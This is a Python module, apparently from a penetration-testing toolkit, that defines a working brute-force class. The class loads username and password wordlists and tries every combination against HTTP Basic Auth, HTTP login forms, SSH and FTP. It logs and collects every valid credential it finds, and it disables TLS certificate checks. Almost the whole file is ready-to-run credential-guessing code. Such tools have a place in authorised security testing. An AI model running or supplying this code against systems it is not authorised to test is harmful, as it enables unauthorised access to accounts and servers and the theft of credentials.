"""
Brute Force Module
Username and password brute forcing for various protocols
"""
import requests
import time
import paramiko
import ftplib
from tqdm import tqdm
from datetime import datetime
from requests.auth import HTTPBasicAuth
from utils.logger import setup_logger, success

logger = setup_logger('BruteForce')


class BruteForce:
    """Brute force credentials for various services"""
    
    def __init__(self, delay=0.5, timeout=10):
        """
        Initialize brute force module
        
        Args:
            delay: Delay between attempts (seconds)
            timeout: Request timeout (seconds)
        """
        self.delay = delay
        self.timeout = timeout
        self.results = []
    
    def load_wordlist(self, filename):
        """
        Load wordlist from file
        
        Args:
            filename: Path to wordlist file
            
        Returns:
            list: List of words
        """
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(words)} entries from {filename}")
            return words
        except FileNotFoundError:
            logger.error(f"Wordlist not found: {filename}")
            return []
        except Exception as e:
            logger.error(f"Error loading wordlist: {str(e)}")
            return []
    
    def http_basic_auth(self, url, usernames, passwords):
        """
        Brute force HTTP Basic Authentication
        
        Args:
            url: Target URL
            usernames: List of usernames or path to username wordlist
            passwords: List of passwords or path to password wordlist
            
        Returns:
            dict: Results with successful credentials
        """
        logger.info(f"Starting HTTP Basic Auth brute force on {url}")
        
        # Load wordlists if paths provided
        if isinstance(usernames, str):
            usernames = self.load_wordlist(usernames)
        if isinstance(passwords, str):
            passwords = self.load_wordlist(passwords)
        
        results = {
            'target': url,
            'type': 'http_basic_auth',
            'scan_time': datetime.now().isoformat(),
            'attempts': 0,
            'successful': []
        }
        
        total = len(usernames) * len(passwords)
        
        with tqdm(total=total, desc="HTTP Basic Auth") as pbar:
            for username in usernames:
                for password in passwords:
                    try:
                        response = requests.get(
                            url,
                            auth=HTTPBasicAuth(username, password),
                            timeout=self.timeout,
                            verify=False
                        )
                        
                        results['attempts'] += 1
                        
                        if response.status_code == 200:
                            success(logger, f"Valid credentials: {username}:{password}")
                            results['successful'].append({
                                'username': username,
                                'password': password
                            })
                        
                        time.sleep(self.delay)
                        pbar.update(1)
                        
                    except Exception as e:
                        logger.debug(f"Error: {str(e)}")
                        pbar.update(1)
                        continue
        
        logger.info(f"Found {len(results['successful'])} valid credentials")
        return results
    
    def http_form_auth(self, url, username_field, password_field, usernames, passwords, 
                       success_string=None, failure_string=None, method='POST'):
        """
        Brute force HTTP Form Authentication
        
        Args:
            url: Target URL
            username_field: Name of username field
            password_field: Name of password field
            usernames: List of usernames or path to wordlist
            passwords: List of passwords or path to wordlist
            success_string: String that indicates successful login
            failure_string: String that indicates failed login
            method: HTTP method (POST or GET)
            
        Returns:
            dict: Results with successful credentials
        """
        logger.info(f"Starting HTTP Form Auth brute force on {url}")
        
        # Load wordlists if paths provided
        if isinstance(usernames, str):
            usernames = self.load_wordlist(usernames)
        if isinstance(passwords, str):
            passwords = self.load_wordlist(passwords)
        
        results = {
            'target': url,
            'type': 'http_form_auth',
            'scan_time': datetime.now().isoformat(),
            'attempts': 0,
            'successful': []
        }
        
        total = len(usernames) * len(passwords)
        session = requests.Session()
        
        with tqdm(total=total, desc="HTTP Form Auth") as pbar:
            for username in usernames:
                for password in passwords:
                    try:
                        data = {
                            username_field: username,
                            password_field: password
                        }
                        
                        if method.upper() == 'POST':
                            response = session.post(url, data=data, timeout=self.timeout, verify=False)
                        else:
                            response = session.get(url, params=data, timeout=self.timeout, verify=False)
                        
                        results['attempts'] += 1
                        
                        # Check for success
                        is_success = False
                        if success_string and success_string in response.text:
                            is_success = True
                        elif failure_string and failure_string not in response.text:
                            is_success = True
                        elif response.status_code == 200 and 'login' not in response.url.lower():
                            is_success = True
                        
                        if is_success:
                            success(logger, f"Valid credentials: {username}:{password}")
                            results['successful'].append({
                                'username': username,
                                'password': password
                            })
                        
                        time.sleep(self.delay)
                        pbar.update(1)
                        
                    except Exception as e:
                        logger.debug(f"Error: {str(e)}")
                        pbar.update(1)
                        continue
        
        logger.info(f"Found {len(results['successful'])} valid credentials")
        return results
    
    def ssh_bruteforce(self, host, port, usernames, passwords):
        """
        Brute force SSH credentials
        
        Args:
            host: Target host
            port: SSH port (default 22)
            usernames: List of usernames or path to wordlist
            passwords: List of passwords or path to wordlist
            
        Returns:
            dict: Results with successful credentials
        """
        logger.info(f"Starting SSH brute force on {host}:{port}")
        
        # Load wordlists if paths provided
        if isinstance(usernames, str):
            usernames = self.load_wordlist(usernames)
        if isinstance(passwords, str):
            passwords = self.load_wordlist(passwords)
        
        results = {
            'target': f"{host}:{port}",
            'type': 'ssh',
            'scan_time': datetime.now().isoformat(),
            'attempts': 0,
            'successful': []
        }
        
        total = len(usernames) * len(passwords)
        
        with tqdm(total=total, desc="SSH Brute Force") as pbar:
            for username in usernames:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        ssh.connect(
                            host,
                            port=port,
                            username=username,
                            password=password,
                            timeout=self.timeout,
                            allow_agent=False,
                            look_for_keys=False
                        )
                        
                        results['attempts'] += 1
                        success(logger, f"Valid SSH credentials: {username}:{password}")
                        results['successful'].append({
                            'username': username,
                            'password': password
                        })
                        
                        ssh.close()
                        time.sleep(self.delay)
                        pbar.update(1)
                        
                    except paramiko.AuthenticationException:
                        results['attempts'] += 1
                        pbar.update(1)
                    except Exception as e:
                        logger.debug(f"SSH Error: {str(e)}")
                        pbar.update(1)
                        continue
        
        logger.info(f"Found {len(results['successful'])} valid SSH credentials")
        return results
    
    def ftp_bruteforce(self, host, port, usernames, passwords):
        """
        Brute force FTP credentials
        
        Args:
            host: Target host
            port: FTP port (default 21)
            usernames: List of usernames or path to wordlist
            passwords: List of passwords or path to wordlist
            
        Returns:
            dict: Results with successful credentials
        """
        logger.info(f"Starting FTP brute force on {host}:{port}")
        
        # Load wordlists if paths provided
        if isinstance(usernames, str):
            usernames = self.load_wordlist(usernames)
        if isinstance(passwords, str):
            passwords = self.load_wordlist(passwords)
        
        results = {
            'target': f"{host}:{port}",
            'type': 'ftp',
            'scan_time': datetime.now().isoformat(),
            'attempts': 0,
            'successful': []
        }
        
        total = len(usernames) * len(passwords)
        
        with tqdm(total=total, desc="FTP Brute Force") as pbar:
            for username in usernames:
                for password in passwords:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(host, port, timeout=self.timeout)
                        ftp.login(username, password)
                        
                        results['attempts'] += 1
                        success(logger, f"Valid FTP credentials: {username}:{password}")
                        results['successful'].append({
                            'username': username,
                            'password': password
                        })
                        
                        ftp.quit()
                        time.sleep(self.delay)
                        pbar.update(1)
                        
                    except ftplib.error_perm:
                        results['attempts'] += 1
                        pbar.update(1)
                    except Exception as e:
                        logger.debug(f"FTP Error: {str(e)}")
                        pbar.update(1)
                        continue
        
        logger.info(f"Found {len(results['successful'])} valid FTP credentials")
        return results


def main():
    """Test function"""
    bf = BruteForce()
    # Example: bf.http_basic_auth('http://example.com', ['admin'], ['password'])


if __name__ == '__main__':
    main()
